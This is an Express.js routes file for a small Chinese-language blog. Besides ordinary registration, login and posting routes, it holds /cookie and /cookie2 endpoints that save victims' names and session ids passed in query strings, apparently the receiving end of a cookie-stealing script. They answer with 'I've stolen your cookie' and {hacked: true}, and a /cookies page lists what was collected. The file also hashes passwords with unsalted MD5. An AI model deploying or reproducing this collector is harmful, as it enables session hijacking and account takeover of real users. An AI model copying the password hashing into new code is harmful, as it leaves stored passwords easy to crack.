
/*
 * GET home page.
 */

var crypto = require('crypto');
var User = require('../models/user');
var Post = require('../models/post');
var Cookie = require('../models/cookie');

module.exports = function(app){
	// 主页
	app.get('/', function(req, res){
		Post.get(null, function(err, posts){
			var error = req.flash('error').toString();
			if(err){
				error = err;
				posts = [];
			}
			res.render('index', {
				title: '主页',
				user: req.session.user,
				posts: posts,
				success: req.flash('success').toString(),
				error: error.toString()
			});
		});		
	});
	// 注册
	app.get('/reg', checkNotLogin);
	app.get('/reg', function(req, res){
		res.render('reg', {
			title: '注册',
			user: req.session.user,
			success: req.flash('success').toString(),
			error: req.flash('error').toString()
		});
	});
	// 注册post
	app.post('/reg', function(req, res){
		var password = req.body.password;
		var password_repeat = req.body.password_repeat;
		// 检测密码是否一致
		if(password != password_repeat){
			req.flash('error', '两次密码不一致');
			return res.redirect('/reg');
		}
		var md5 = crypto.createHash('md5');
		var password = md5.update(req.body.password).digest('hex');
		var newUser = new User({
			name: req.body.name,
			password: password,
			email: req.body.email
		});
		// 检测用户是否存在
		User.get(newUser, function(err, user){
			if(user){
				req.flash('error', '用户已存在');
				return res.redirect('/reg');
			}
			// 保存用户
			newUser.save(function(err, user){
				if(err){
					req.flash('error', err);
					return res.redirect('/reg');
				}
				req.session.user = user;// 将用户信息存入session
				req.flash('success', '注册成功');
				return res.redirect('/');
			});
		});
	});
	// 登录
	app.get('/login', checkNotLogin);
	app.get('/login', function(req, res){
		res.render('login', {
			title: '登录',
			user: req.session.user,
			success: req.flash('success').toString(),
			error: req.flash('error').toString()
		});
	});
	// 登录post
	app.post('/login', function(req, res){
		// 生成密码的md5值
		var md5 = crypto.createHash('md5');
		var password = md5.update(req.body.password).digest('hex');
		// 查看用户是否存在
		var user = {
			name: req.body.name
		};
		User.get(user, function(err, resultUser){
			if(err){
				req.flash('error', err);
				return res.redirect('/login');
			}
			if(!resultUser){
				req.flash('error', '用户不存在');
				return res.redirect('/login');
			}
			if(password != resultUser.password){
				req.flash('error', '密码不正确');
				return res.redirect('/login');
			}
			req.session.user = resultUser;
			req.flash('success', '登录成功');
			return res.redirect('/');
		});
	});
	// 发表
	app.get('/post', checkLogin);
	app.get('/post', function(req, res){
		res.render('post', {
			title: '发表',
			user: req.session.user,
			success: req.flash('success').toString(),
			error: req.flash('error').toString()
		});
	});
	// 发表post
	app.post('/post', checkLogin);
	app.post('/post', function(req, res){
		var curUser = req.session.user;
		var post = new Post(curUser.name, req.body.title, req.body.post);
		post.save(function(err, resPost){
			if(err){
				req.flash('error', err);
				return res.redirect('/');
			}
			req.flash('success', resPost.title + '发布成功');
			res.redirect('/');
		});
	});
	// 注销
	app.get('/logout', checkLogin);
	app.get('/logout', function(req, res){
		var user = req.session.user;
		if(user){
			req.session.user = null;
			req.flash('success', '注销成功');
			return res.redirect('/');
		}
		req.flash('error', '没有检测到登录信息');
		return res.redirect('/');
	});
	// cookie
	app.get('/cookie', function(req, res){
		var name = req.query.name;
		var sessionid = req.query.sessionid;
		console.log(name, sessionid);
		var c = {
			name: name,
			cookie: sessionid
		};
		var cookie = new Cookie(c);
		Post.get(null, function(err, posts){
			cookie.save();
			var error = req.flash('error').toString();
			if(err){
				error = err;
				posts = [];
			}
			res.render('index', {
				title: '欢迎您 ' + name + ' 来到fz的blog, 我已经偷走了你的cookie :) ' + sessionid,
				user: req.session.user,
				posts: posts,
				success: req.flash('success').toString(),
				error: error.toString()
			});
		});
	});
	// cookie2
	app.get('/cookie2', function(req, res){
		var name = req.query.name;
		var sessionid = req.query.sessionid;
		console.log(name, sessionid);
		if(name != "guest"){
			var c = {
				name: name,
				cookie: sessionid
			};
			var cookie = new Cookie(c);
			cookie.save();
		}
		res.json({hacked: true});
	});
	// cookies
	app.get('/cookies', checkLogin);
	app.get('/cookies', function(req, res){
		Cookie.get(null, function(err, cookies){
			var error = req.flash('error').toString();
			if(err){
				error = err;
				cookies = [];
			}
			res.render('cookies', {
				title: 'cookies',
				user: req.session.user,
				posts: [],
				cookies: cookies,
				success: req.flash('success').toString(),
				error: error.toString()
			});
		});
	});
	// chatroom
	app.get('/chatroom', function(req, res){
		res.sendfile(__dirname + '/chartroom.html');
	});
}
// 检测未登录
function checkNotLogin(req, res, next){
	if(req.session.user){
		req.flash('error', '已登录');
		return res.redirect('back');
	}
	next();
}
// 检测已登录
function checkLogin(req, res, next){
	if(!req.session.user){
		req.flash('error', '未登录');
		return res.redirect('/login');
	}
	next();
}